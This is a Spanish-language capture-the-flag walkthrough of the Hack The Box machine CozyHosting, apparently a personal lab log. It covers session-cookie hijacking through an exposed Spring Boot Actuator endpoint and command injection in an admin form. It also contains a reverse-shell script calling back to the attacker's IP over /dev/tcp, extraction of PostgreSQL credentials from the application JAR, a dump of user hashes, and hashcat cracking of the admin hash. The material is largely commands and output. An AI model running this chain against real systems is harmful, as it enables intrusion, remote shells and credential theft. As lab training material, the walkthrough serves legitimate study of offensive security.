El campo `username` llega a una shell del sistema y permite alterar la línea de ejecución.

La validación definitiva se obtiene cuando el objetivo realiza una petición HTTP saliente hacia el servidor controlado por el operador.

## Cadena confirmada


Spring Boot Actuator expuesto
→ /actuator/sessions
→ sesión válida de kanderson
→ acceso a /admin
→ formulario /executessh
→ parámetro username vulnerable
→ command injection
→ callback externo recibido
→ ejecución remota confirmada

## Creamo el archivo rev.sh en el mismo directorio que hemos puesto el puerto 7000 en escucha:

echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.15.26/4444 0>&1' > rev.sh

# Le damos permisos de ejecución:

chmod +x rev.sh

## Objetivo de esta fase

Obtener una shell interactiva desde el objetivo y confirmar que la ejecución se produce realmente en la máquina CozyHosting, no en la máquina atacante.

Para ello se mantienen separadas tres piezas:

Terminal 1 → servidor HTTP en el puerto 7000
Terminal 2 → listener netcat en el puerto 4444
Navegador  → panel /admin autenticado como K. Anderson
1. Mantener abierto el servidor HTTP en el puerto 7000

En una terminal de la máquina atacante se deja abierto el servidor HTTP que servirá el fichero rev.sh.

El servidor debe arrancarse desde el directorio donde exista realmente el fichero rev.sh.

cd /home/r4mon/pentest/targets/HTB/easy/CozyHosting
python3 -m http.server 7000

La terminal debe quedar escuchando:

Serving HTTP on 0.0.0.0 port 7000
Punto crítico

Si al lanzar la petición aparece algo como:

GET /rev.sh HTTP/1.1" 404 -

significa que el fichero rev.sh no está en el directorio desde el que se ha levantado el servidor HTTP.

Ese error es local de la máquina atacante, no del objetivo.

La comprobación correcta es:

ls -lh rev.sh

El fichero debe estar en el mismo directorio desde el que se ejecuta:

python3 -m http.server 7000
2. Abrir el listener en el puerto 4444

En una segunda terminal se abre el listener que recibirá la conexión entrante desde CozyHosting.

nc -lvnp 4444

La terminal debe quedar esperando:

listening on [any] 4444 ...
3. Confirmar que la sesión de kanderson sigue activa

Antes de volver al navegador, se comprueba qué sesiones activas expone Actuator:

curl -sS http://cozyhosting.htb/actuator/sessions

La respuesta observada fue:

{
  "C42BC31D847B65FA25FE4A4AB541318E": "UNAUTHORIZED",
  "1129638E080FFCADC2EDD2B617160C46": "UNAUTHORIZED",
  "405F6C1B7D933B6BE1F873BBB79023ED": "UNAUTHORIZED",
  "45CE26F0AAE9695F22A16A62957B9B9B": "kanderson"
}

La cookie útil es la asociada a kanderson:

45CE26F0AAE9695F22A16A62957B9B9B

Las sesiones marcadas como UNAUTHORIZED no sirven para acceder al panel.

4. Validar la cookie por terminal

Antes de modificar el navegador, se confirma por terminal que la cookie realmente permite entrar en /admin.

curl -sS -i http://cozyhosting.htb/admin \
  -H 'Cookie: JSESSIONID=45CE26F0AAE9695F22A16A62957B9B9B' | head -n 20

La respuesta correcta debe empezar con:

HTTP/1.1 200

En este caso, la cookie era válida:

HTTP/1.1 200
Server: nginx/1.18.0 (Ubuntu)
Content-Type: text/html;charset=UTF-8

El mensaje final:

curl: (23) Failed writing body

no es un problema del objetivo. Aparece porque head corta la salida después de las primeras líneas y curl intenta seguir escribiendo.

La parte importante es el código:

HTTP/1.1 200
5. Entrar al panel desde el navegador

En Firefox se abre:

http://cozyhosting.htb/login

No se introduce usuario ni contraseña.

Después se abren las herramientas de desarrollo y se va a:

Almacenamiento → Cookies → http://cozyhosting.htb

Ahí se borra cualquier cookie previa llamada:

JSESSIONID

Después se crea o edita una nueva cookie con estos valores:

Nombre: JSESSIONID
Valor: 45CE26F0AAE9695F22A16A62957B9B9B
Dominio: cozyhosting.htb
Ruta: /

Una vez guardada la cookie, se navega directamente a:

http://cozyhosting.htb/admin

No hay que pulsar el botón de login.

Resultado esperado

El navegador debe mostrar el panel:

Dashboard - Cozy Cloud

En la parte superior derecha debe aparecer el usuario:

K. Anderson

Esto confirma que la sesión filtrada se ha reutilizado correctamente desde el navegador.

6. Localizar el formulario vulnerable

Dentro del dashboard se baja hasta la sección:

Include host into automatic patching

El formulario contiene dos campos:

Hostname
Username

La funcionalidad está pensada para que Cozy Scanner intente conectarse al host indicado por el usuario mediante SSH.

El HTML del panel ya había confirmado que el formulario envía los datos a:

POST /executessh

Y que los parámetros controlables son:

host
username
7. Rellenar el formulario en la web

En el campo Hostname se introduce:

127.0.0.1

En el campo Username se introduce el payload ya preparado para descargar y ejecutar rev.sh desde el servidor HTTP del puerto 7000.

Después se pulsa:

Submit
Punto importante

El payload no se ejecuta en una terminal local.

El payload no se escribe en la terminal del servidor HTTP.

El payload no se escribe en la terminal del listener nc.

El payload se introduce únicamente en el campo Username del formulario web, dentro de:

http://cozyhosting.htb/admin
8. Señales correctas de ejecución

En la terminal donde está abierto el servidor HTTP en el puerto 7000, debe verse una petición desde la IP de la víctima:

10.129.37.233 - - [...] "GET /rev.sh HTTP/1.1" 200 -

La parte importante es:

10.129.37.233

y que el código sea:

200

Eso confirma que CozyHosting ha descargado correctamente rev.sh.

9. Recepción de la shell

En la terminal donde está abierto el listener 4444, debe recibirse una conexión entrante desde la IP de la víctima:

connect to [10.10.15.26] from (UNKNOWN) [10.129.37.233] 48724
sh: 0: can't access tty; job control turned off

La IP importante es:

10.129.37.233

Eso confirma que la conexión viene desde CozyHosting.

10. Validación de contexto

Una vez recibida la shell, se comprueba el usuario efectivo:

whoami

Resultado:

app

Se comprueba el hostname:

hostname

Resultado:

cozyhosting
Conclusión de la fase

La shell obtenida pertenece realmente a la máquina objetivo.

La validación queda cerrada con:

usuario: app
host: cozyhosting
origen de conexión: 10.129.37.233

## La fase de acceso inicial queda cerrada con shell como usuario app.

Spring Boot Actuator expuesto
→ sesión activa de kanderson
→ acceso al dashboard
→ formulario /executessh
→ command injection en username
→ descarga de rev.sh desde la máquina atacante
→ conexión entrante al listener
→ shell como app en cozyhosting
Siguiente paso

## Tras obtener shell como app, la siguiente fase es enumerar el sistema desde dentro, priorizando:

usuario efectivo
directorio actual
contenido de /app
ficheros .jar
configuración de Spring Boot
credenciales internas
PostgreSQL local
usuarios del sistema

## Objetivo

Continuar la fase posterior al foothold de CozyHosting desde la shell obtenida como usuario app, documentando el contexto real de ejecución y empezando la enumeración de la aplicación Spring Boot.

Hechos verificados

La conexión recibida en el listener procede de la IP de la máquina objetivo:

connect to [10.10.15.26] from (UNKNOWN) [10.129.37.233] 48724

La shell no tiene TTY interactiva completa:

sh: 0: can't access tty; job control turned off

El usuario efectivo es:

app

El hostname de la máquina comprometida es:

cozyhosting

En el directorio actual aparece el fichero:

cloudhosting-0.0.1.jar
Supuestos

El directorio actual probablemente corresponde al directorio de despliegue de la aplicación.

El fichero cloudhosting-0.0.1.jar es el artefacto principal de la aplicación Spring Boot.

La siguiente línea de trabajo no debe saltar directamente a escalada local. Primero debe revisarse el JAR, porque en aplicaciones Spring Boot es habitual que contenga configuración interna, rutas, propiedades de conexión y posibles credenciales.

Método

La secuencia correcta ahora es:

shell como app
→ confirmar contexto local
→ estabilizar mínimamente la shell
→ revisar directorio actual
→ extraer el JAR
→ buscar application.properties
→ localizar configuración de base de datos
→ validar si existen credenciales internas reutilizables

El hallazgo dominante ya no está en la web, sino en el artefacto local de la aplicación.

Respuesta

La fase de foothold queda confirmada correctamente: se ha obtenido una shell real en CozyHosting como usuario app.

El siguiente paso único es analizar el JAR cloudhosting-0.0.1.jar, empezando por extraerlo en /tmp y revisar sus ficheros de configuración.

Comandos

Ejecutar estos comandos dentro de la shell recibida, es decir, en la terminal donde está el nc:

whoami
id
hostname
pwd
ls -la

Mejorar mínimamente la shell:

script /dev/null -c bash

Volver a confirmar contexto:

whoami
id
hostname
pwd
ls -la

Comprobar el JAR:

ls -lh cloudhosting-0.0.1.jar
file cloudhosting-0.0.1.jar

Crear directorio temporal para extraerlo:

mkdir -p /tmp/cozy_jar
unzip -q cloudhosting-0.0.1.jar -d /tmp/cozy_jar

Listar estructura inicial del JAR extraído:

find /tmp/cozy_jar -maxdepth 3 -type f | sort | head -n 80

Buscar ficheros de configuración típicos:

find /tmp/cozy_jar -type f \( -name "*.properties" -o -name "*.yml" -o -name "*.yaml" -o -name "*.xml" \) -print

Revisar application.properties si existe:

cat /tmp/cozy_jar/BOOT-INF/classes/application.properties

Buscar palabras clave sensibles en el JAR extraído:

grep -RniE 'spring.datasource|jdbc|postgres|password|username|user|secret|token|key' /tmp/cozy_jar 2>/dev/null
Comprobaciones

Debe comprobarse el directorio actual exacto con pwd.

Debe comprobarse si el JAR está en el directorio /app o en otro directorio de despliegue.

Debe comprobarse si el fichero application.properties existe dentro de:

/tmp/cozy_jar/BOOT-INF/classes/

Debe comprobarse si aparecen credenciales de base de datos.

Debe comprobarse si la aplicación usa PostgreSQL local.

Debe comprobarse si las credenciales encontradas son datos reales de conexión o simples valores de plantilla.

Notas para el informe

La shell inicial cae como usuario app, que corresponde al contexto de ejecución de la aplicación.

El primer artefacto relevante encontrado es:

cloudhosting-0.0.1.jar

En una aplicación Spring Boot, un JAR no es solo un binario: suele contener clases, plantillas, rutas y configuración interna.

Por eso, tras el foothold, la prioridad metodológica es revisar el JAR antes de iniciar una enumeración local genérica.

Cadena actual:

command injection en /executessh
→ shell como app
→ hostname cozyhosting
→ JAR de aplicación localizado
→ extracción y análisis de configuración pendiente

Hallazgo dominante actual:

cloudhosting-0.0.1.jar accesible desde la shell como app

Siguiente paso único:

extraer el JAR y revisar application.properties

## Ejecutamos:

❯ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.15.26] from (UNKNOWN) [10.129.37.233] 48724
sh: 0: can't access tty; job control turned off
$ whoami
app
$ hostname
cozyhosting
$ ls
cloudhosting-0.0.1.jar
$ script /dev/null -c bash
Script started, output log file is '/dev/null'.
app@cozyhosting:/app$ export TERM=xterm
export TERM=xterm
app@cozyhosting:/app$ pwd
pwd
/app
app@cozyhosting:/app$ ls -la
ls -la
total 58856
drwxr-xr-x  2 root root     4096 Aug 14  2023 .
drwxr-xr-x 19 root root     4096 Aug 14  2023 ..
-rw-r--r--  1 root root 60259688 Aug 11  2023 cloudhosting-0.0.1.jar
app@cozyhosting:/app$ ls -lh cloudhosting-0.0.1.jar
ls -lh cloudhosting-0.0.1.jar
-rw-r--r-- 1 root root 58M Aug 11  2023 cloudhosting-0.0.1.jar
app@cozyhosting:/app$ mkdir -p /tmp/cozy_jar
mkdir -p /tmp/cozy_jar
app@cozyhosting:/app$ nzip -q cloudhosting-0.0.1.jar -d /tmp/cozy_jar
nzip -q cloudhosting-0.0.1.jar -d /tmp/cozy_jar
Command 'nzip' not found, but there are 16 similar ones.
app@cozyhosting:/app$ unzip -q cloudhosting-0.0.1.jar -d /tmp/cozy_jar
unzip -q cloudhosting-0.0.1.jar -d /tmp/cozy_jar
app@cozyhosting:/app$ find /tmp/cozy_jar -maxdepth 3 -type f | sort | head -n 80
/tmp/cozy_jar/BOOT-INF/classes/application.properties-n 80
/tmp/cozy_jar/BOOT-INF/classpath.idx
/tmp/cozy_jar/BOOT-INF/layers.idx
/tmp/cozy_jar/BOOT-INF/lib/angus-activation-1.0.0.jar
/tmp/cozy_jar/BOOT-INF/lib/antlr4-runtime-4.10.1.jar
/tmp/cozy_jar/BOOT-INF/lib/aspectjweaver-1.9.19.jar
/tmp/cozy_jar/BOOT-INF/lib/attoparser-2.0.6.RELEASE.jar
/tmp/cozy_jar/BOOT-INF/lib/byte-buddy-1.12.22.jar
/tmp/cozy_jar/BOOT-INF/lib/checker-qual-3.5.0.jar
/tmp/cozy_jar/BOOT-INF/lib/classmate-1.5.1.jar
/tmp/cozy_jar/BOOT-INF/lib/HdrHistogram-2.1.12.jar
/tmp/cozy_jar/BOOT-INF/lib/hibernate-commons-annotations-6.0.2.Final.jar
/tmp/cozy_jar/BOOT-INF/lib/hibernate-core-6.1.6.Final.jar
/tmp/cozy_jar/BOOT-INF/lib/HikariCP-5.0.1.jar
/tmp/cozy_jar/BOOT-INF/lib/istack-commons-runtime-4.1.1.jar
/tmp/cozy_jar/BOOT-INF/lib/jackson-annotations-2.14.1.jar
/tmp/cozy_jar/BOOT-INF/lib/jackson-core-2.14.1.jar
/tmp/cozy_jar/BOOT-INF/lib/jackson-databind-2.14.1.jar
/tmp/cozy_jar/BOOT-INF/lib/jackson-datatype-jdk8-2.14.1.jar
/tmp/cozy_jar/BOOT-INF/lib/jackson-datatype-jsr310-2.14.1.jar
/tmp/cozy_jar/BOOT-INF/lib/jackson-module-parameter-names-2.14.1.jar
/tmp/cozy_jar/BOOT-INF/lib/jakarta.activation-api-2.1.1.jar
/tmp/cozy_jar/BOOT-INF/lib/jakarta.annotation-api-2.1.1.jar
/tmp/cozy_jar/BOOT-INF/lib/jakarta.inject-api-2.0.0.jar
/tmp/cozy_jar/BOOT-INF/lib/jakarta.persistence-api-3.1.0.jar
/tmp/cozy_jar/BOOT-INF/lib/jakarta.transaction-api-2.0.1.jar
/tmp/cozy_jar/BOOT-INF/lib/jakarta.xml.bind-api-4.0.0.jar
/tmp/cozy_jar/BOOT-INF/lib/jandex-2.4.2.Final.jar
/tmp/cozy_jar/BOOT-INF/lib/jaxb-core-4.0.1.jar
/tmp/cozy_jar/BOOT-INF/lib/jaxb-runtime-4.0.1.jar
/tmp/cozy_jar/BOOT-INF/lib/jboss-logging-3.5.0.Final.jar
/tmp/cozy_jar/BOOT-INF/lib/jul-to-slf4j-2.0.6.jar
/tmp/cozy_jar/BOOT-INF/lib/LatencyUtils-2.0.3.jar
/tmp/cozy_jar/BOOT-INF/lib/log4j-api-2.19.0.jar
/tmp/cozy_jar/BOOT-INF/lib/log4j-to-slf4j-2.19.0.jar
/tmp/cozy_jar/BOOT-INF/lib/logback-classic-1.4.5.jar
/tmp/cozy_jar/BOOT-INF/lib/logback-core-1.4.5.jar
/tmp/cozy_jar/BOOT-INF/lib/lombok-1.18.26.jar
/tmp/cozy_jar/BOOT-INF/lib/micrometer-commons-1.10.3.jar
/tmp/cozy_jar/BOOT-INF/lib/micrometer-core-1.10.3.jar
/tmp/cozy_jar/BOOT-INF/lib/micrometer-observation-1.10.3.jar
/tmp/cozy_jar/BOOT-INF/lib/postgresql-42.5.1.jar
/tmp/cozy_jar/BOOT-INF/lib/slf4j-api-2.0.6.jar
/tmp/cozy_jar/BOOT-INF/lib/snakeyaml-1.33.jar
/tmp/cozy_jar/BOOT-INF/lib/spring-aop-6.0.4.jar
/tmp/cozy_jar/BOOT-INF/lib/spring-aspects-6.0.4.jar
/tmp/cozy_jar/BOOT-INF/lib/spring-beans-6.0.4.jar
/tmp/cozy_jar/BOOT-INF/lib/spring-boot-3.0.2.jar
/tmp/cozy_jar/BOOT-INF/lib/spring-boot-actuator-3.0.2.jar
/tmp/cozy_jar/BOOT-INF/lib/spring-boot-actuator-autoconfigure-3.0.2.jar
/tmp/cozy_jar/BOOT-INF/lib/spring-boot-autoconfigure-3.0.2.jar
/tmp/cozy_jar/BOOT-INF/lib/spring-boot-jarmode-layertools-3.0.2.jar
/tmp/cozy_jar/BOOT-INF/lib/spring-context-6.0.4.jar
/tmp/cozy_jar/BOOT-INF/lib/spring-core-6.0.4.jar
/tmp/cozy_jar/BOOT-INF/lib/spring-data-commons-3.0.1.jar
/tmp/cozy_jar/BOOT-INF/lib/spring-data-jpa-3.0.1.jar
/tmp/cozy_jar/BOOT-INF/lib/spring-expression-6.0.4.jar
/tmp/cozy_jar/BOOT-INF/lib/spring-jcl-6.0.4.jar
/tmp/cozy_jar/BOOT-INF/lib/spring-jdbc-6.0.4.jar
/tmp/cozy_jar/BOOT-INF/lib/spring-orm-6.0.4.jar
/tmp/cozy_jar/BOOT-INF/lib/spring-security-config-6.0.1.jar
/tmp/cozy_jar/BOOT-INF/lib/spring-security-core-6.0.1.jar
/tmp/cozy_jar/BOOT-INF/lib/spring-security-crypto-6.0.1.jar
/tmp/cozy_jar/BOOT-INF/lib/spring-security-web-6.0.1.jar
/tmp/cozy_jar/BOOT-INF/lib/spring-session-core-3.0.0.jar
/tmp/cozy_jar/BOOT-INF/lib/spring-tx-6.0.4.jar
/tmp/cozy_jar/BOOT-INF/lib/spring-web-6.0.4.jar
/tmp/cozy_jar/BOOT-INF/lib/spring-webmvc-6.0.4.jar
/tmp/cozy_jar/BOOT-INF/lib/thymeleaf-3.1.1.RELEASE.jar
/tmp/cozy_jar/BOOT-INF/lib/thymeleaf-extras-springsecurity6-3.1.1.RELEASE.jar
/tmp/cozy_jar/BOOT-INF/lib/thymeleaf-spring6-3.1.1.RELEASE.jar
/tmp/cozy_jar/BOOT-INF/lib/tomcat-embed-core-10.1.5.jar
/tmp/cozy_jar/BOOT-INF/lib/tomcat-embed-el-10.1.5.jar
/tmp/cozy_jar/BOOT-INF/lib/tomcat-embed-websocket-10.1.5.jar
/tmp/cozy_jar/BOOT-INF/lib/txw2-4.0.1.jar
/tmp/cozy_jar/BOOT-INF/lib/unbescape-1.1.6.RELEASE.jar
/tmp/cozy_jar/META-INF/MANIFEST.MF
app@cozyhosting:/app$ find /tmp/cozy_jar -type f \( -name "*.properties" -o -name "*.yml" -o -name "*.yaml" -o -name "*.xml" \) -print
find /tmp/cozy_jar -type f \( -name "*.properties" -o -name "*.yml" -o -name "*.yaml" -o -name "*.xml" \) -print
/tmp/cozy_jar/BOOT-INF/classes/application.properties
/tmp/cozy_jar/META-INF/maven/htb.cloudhosting/cloudhosting/pom.xml
/tmp/cozy_jar/META-INF/maven/htb.cloudhosting/cloudhosting/pom.properties
app@cozyhosting:/app$ cat /tmp/cozy_jar/BOOT-INF/classes/application.properties
cat /tmp/cozy_jar/BOOT-INF/classes/application.properties
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxRapp@cozyhosting:/app$

## ````md
## Objetivo

Analizar la enumeración local realizada desde la shell como `app`, corregir el problema del `grep` excesivo y fijar el siguiente paso hacia la base de datos PostgreSQL local.

## Hechos verificados

La shell pertenece a la máquina objetivo:

```text
whoami
app

hostname
cozyhosting
````

El directorio actual es:

```text
/app
```

En `/app` existe el artefacto principal de la aplicación:

```text
cloudhosting-0.0.1.jar
```

El fichero pesa aproximadamente:

```text
58M
```

El JAR se ha extraído correctamente en:

```text
/tmp/cozy_jar
```

Dentro del JAR extraído aparece el fichero de configuración principal de Spring Boot:

```text
/tmp/cozy_jar/BOOT-INF/classes/application.properties
```

El fichero `application.properties` contiene configuración sensible de la aplicación:

```properties
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```

## Lectura didáctica

El hallazgo importante de esta fase no es simplemente que exista un JAR, sino que el JAR contiene la configuración interna de la aplicación.

En aplicaciones Spring Boot, `application.properties` suele ser uno de los primeros ficheros que se deben revisar tras conseguir acceso al sistema, porque puede contener:

* configuración del servidor;
* endpoints expuestos;
* configuración de sesión;
* conexión a base de datos;
* usuarios internos;
* contraseñas;
* tokens o secretos.

En este caso, el fichero confirma que la aplicación usa PostgreSQL local y expone una credencial válida para conectarse a la base de datos `cozyhosting`.

## Sobre el grep demasiado largo

El comando:

```bash
grep -RniE 'spring.datasource|jdbc|postgres|password|username|user|secret|token|key' /tmp/cozy_jar 2>/dev/null
```

genera demasiada salida porque busca dentro de todo el árbol extraído, incluyendo muchas librerías en:

```text
/tmp/cozy_jar/BOOT-INF/lib/
```

Ese directorio contiene dependencias Java, y muchas de ellas incluyen cadenas como `user`, `key`, `token`, `password` o `postgres`. Por eso la salida se vuelve enorme y poco útil.

La forma correcta es acotar la búsqueda a configuración y clases propias de la aplicación, no a todas las dependencias.

## Comandos más limpios

Buscar solo en las clases y configuración de la aplicación:

```bash
grep -RniE 'spring.datasource|jdbc|postgres|password|username|secret|token|key' \
  /tmp/cozy_jar/BOOT-INF/classes 2>/dev/null
```

Buscar solo ficheros de configuración:

```bash
find /tmp/cozy_jar -type f \( -name "*.properties" -o -name "*.yml" -o -name "*.yaml" -o -name "*.xml" \) -print
```

Revisar únicamente el fichero sensible ya localizado:

```bash
cat /tmp/cozy_jar/BOOT-INF/classes/application.properties
```

## Hallazgo dominante

El hallazgo dominante ahora es la credencial PostgreSQL expuesta en `application.properties`:

```text
usuario: postgres
password: Vg&nvzAQ7XxR
base de datos: cozyhosting
host: localhost
puerto: 5432
```

## Siguiente paso

El siguiente paso único es conectarse a PostgreSQL local con la credencial encontrada y enumerar la base de datos `cozyhosting`.

## Comandos

Estos comandos se ejecutan dentro de la shell como `app` en CozyHosting.

Comprobar si `psql` está disponible:

```bash
which psql
psql --version
```

Conectarse directamente a la base de datos usando la contraseña encontrada:

```bash
PGPASSWORD='Vg&nvzAQ7XxR' psql -h 127.0.0.1 -U postgres -d cozyhosting
```

Una vez dentro de `psql`, listar tablas:

```sql
\dt
```

Consultar la tabla de usuarios si existe:

```sql
SELECT * FROM users;
```

Salir de `psql`:

```sql
\q
```

## Alternativa no interactiva

Si se prefiere evitar el modo interactivo de `psql`, se puede ejecutar todo con comandos directos:

```bash
PGPASSWORD='Vg&nvzAQ7XxR' psql -h 127.0.0.1 -U postgres -d cozyhosting -c '\dt'
```

```bash
PGPASSWORD='Vg&nvzAQ7XxR' psql -h 127.0.0.1 -U postgres -d cozyhosting -c 'SELECT * FROM users;'
```

## Comprobaciones

Debe comprobarse si la conexión a PostgreSQL funciona.

Debe comprobarse qué tablas existen en la base `cozyhosting`.

Debe comprobarse si la tabla `users` contiene usuarios, hashes o credenciales reutilizables.

Debe comprobarse el formato de los hashes encontrados antes de intentar cualquier uso posterior.

## Notas para el informe

Tras conseguir shell como `app`, la revisión del directorio `/app` revela el JAR principal de la aplicación.

La extracción del JAR permite localizar `application.properties`.

Ese fichero contiene la configuración de PostgreSQL y expone una contraseña para el usuario `postgres`.

Este hallazgo cambia la rama activa:

```text
shell como app
→ JAR de Spring Boot
→ application.properties
→ credenciales PostgreSQL
→ enumeración de base de datos local
```

La siguiente fase debe centrarse en la base de datos `cozyhosting`, especialmente en la tabla de usuarios.

```
```
## Ejecutamos:

app@cozyhosting:/app$ PGPASSWORD='Vg&nvzAQ7XxR' psql -h 127.0.0.1 -U postgres -d cozyhosting -P pager=off -c '\dt'
PGPASSWORD='Vg&nvzAQ7XxR' psql -h 127.0.0.1 -U postgres -d cozyhosting -P pager=off -c '\dt'
         List of relations
 Schema | Name  | Type  |  Owner
--------+-------+-------+----------
 public | hosts | table | postgres
 public | users | table | postgres
(2 rows)

app@cozyhosting:/app$ PGPASSWORD='Vg&nvzAQ7XxR' psql -h 127.0.0.1 -U postgres -d cozyhosting -P pager=off -c 'SELECT * FROM users;'
PGPASSWORD='Vg&nvzAQ7XxR' psql -h 127.0.0.1 -U postgres -d cozyhosting -P pager=off -c 'SELECT * FROM users;'
   name    |                           password                           | role
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
(2 rows)

app@cozyhosting:/app$

## ## Objetivo

Continuar desde la enumeración de PostgreSQL local, interpretar los hashes encontrados en la tabla `users` y preparar el siguiente paso: crackeo offline y posible reutilización de credenciales contra usuarios locales del sistema.

## Hechos verificados

Desde la shell como `app`, la conexión a PostgreSQL funciona usando las credenciales extraídas de `application.properties`:

```text
usuario: postgres
password: Vg&nvzAQ7XxR
base de datos: cozyhosting
host: 127.0.0.1
```

La base de datos `cozyhosting` contiene dos tablas:

```text
public.hosts
public.users
```

La tabla `users` contiene dos usuarios de aplicación:

```text
kanderson
admin
```

Los hashes almacenados son de este formato:

```text
$2a$10$...
```

Ese prefijo corresponde a hashes **bcrypt**.

El usuario `admin` tiene rol:

```text
Admin
```

El hash de `admin` es:

```text
$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm
```

## Supuestos

El hash de `admin` es el candidato prioritario porque pertenece a un usuario con rol administrativo dentro de la aplicación.

La contraseña crackeada podría estar reutilizada en un usuario local del sistema, pero eso aún debe verificarse.

Antes de probar SSH, conviene revisar `/etc/passwd` para identificar usuarios locales reales.

## Método

La secuencia correcta ahora es:

```text
PostgreSQL local
→ tabla users
→ hashes bcrypt
→ crackeo offline del hash admin
→ revisión de usuarios locales
→ prueba controlada de reutilización por SSH
```

No debe asumirse que el usuario `admin` de la aplicación existe también como usuario Linux.

Primero se identifica qué usuarios locales existen en el sistema. Después se prueba si la contraseña crackeada sirve para alguno de ellos.

## Respuesta

El hallazgo dominante ahora es el hash bcrypt del usuario `admin`.

La rama activa cambia de:

```text
JAR / configuración interna
```

a:

```text
Credenciales / hashes / reutilización
```

El siguiente paso único es llevar el hash de `admin` a la máquina atacante y crackearlo offline con Hashcat o John.

## Comandos

## En la shell del objetivo

Revisar usuarios locales del sistema:

```bash
cat /etc/passwd | grep -E '/bin/bash|/bin/sh'
```

Guardar solo el hash de `admin` en un fichero temporal del objetivo:

```bash
echo '$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm' > /tmp/admin_hash.txt
```

Mostrarlo para copiarlo a la máquina atacante:

```bash
cat /tmp/admin_hash.txt
```

## En la máquina atacante

Crear fichero local con el hash:

```bash
cd /home/r4mon/pentest/targets/HTB/easy/CozyHosting/exploits

cat > admin_hash.txt << 'EOF'
$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm
EOF
```

Identificar el tipo de hash si se quiere dejar evidencia:

```bash
hashid admin_hash.txt
```

Crackear con Hashcat en modo bcrypt:

```bash
hashcat -m 3200 admin_hash.txt /usr/share/wordlists/rockyou.txt
```

Mostrar el resultado crackeado:

```bash
hashcat -m 3200 admin_hash.txt /usr/share/wordlists/rockyou.txt --show
```

## Alternativa con John

```bash
john admin_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

```bash
john admin_hash.txt --show
```

## Después de obtener la contraseña

Revisar qué usuarios locales existen y probar solo contra usuarios reales.

Si aparece el usuario local `josh`, validar acceso SSH:

```bash
ssh josh@10.129.37.233
```

## Comprobaciones

Debe comprobarse que el hash crackeado pertenece al usuario `admin` de la aplicación.

Debe comprobarse qué usuarios locales existen en `/etc/passwd`.

Debe comprobarse si la contraseña crackeada se reutiliza en un usuario local real.

Debe comprobarse si SSH acepta la contraseña.

Debe documentarse la diferencia entre:

```text
usuario de aplicación: admin
usuario local Linux: pendiente de verificar
```

## Notas para el informe

La aplicación almacena hashes bcrypt en la tabla `users` de PostgreSQL.

El acceso a la base de datos se obtuvo gracias a las credenciales expuestas dentro de `application.properties`.

El hash más relevante es el del usuario `admin`, porque tiene rol administrativo en la aplicación.

La siguiente fase no consiste en usar directamente `admin` por SSH, sino en crackear el hash y comprobar si la contraseña está reutilizada por algún usuario local del sistema.

Cadena actual:

```text
shell como app
→ extracción del JAR
→ application.properties
→ credenciales PostgreSQL
→ tabla users
→ hash bcrypt de admin
→ crackeo offline
→ posible reutilización SSH
```
## Ejecutamos:

❯ cd /home/r4mon/pentest/targets/HTB/easy/CozyHosting/exploits

cat > admin_hash.txt << 'EOF'
$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm
EOF
❯ hashcat -m 3200 admin_hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-haswell-Intel(R) Core(TM) i7-10750H CPU @ 2.60GHz, 2802/5668 MB (1024 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib...kVO8dm
Time.Started.....: Sat May  2 19:43:27 2026 (20 secs)
Time.Estimated...: Sat May  2 19:43:47 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
